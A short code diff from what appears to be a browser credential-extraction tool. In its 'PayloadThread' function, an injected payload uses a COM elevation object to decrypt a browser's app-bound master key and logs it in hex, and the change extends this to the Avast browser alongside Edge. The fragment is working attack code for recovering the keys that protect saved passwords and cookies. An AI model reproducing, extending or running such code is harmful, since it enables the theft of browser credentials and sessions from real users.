@@ -141,7 +141,7 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
             if (!encKey.empty()) {
                 try {
                     Com::Elevator elevator;
-                    auto masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge");
+                    auto masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
                     keys.appKey = masterKey;
                     pipe.Log("APP_KEY:" + KeyToHex(masterKey));
                 } catch (const std::exception& e) {
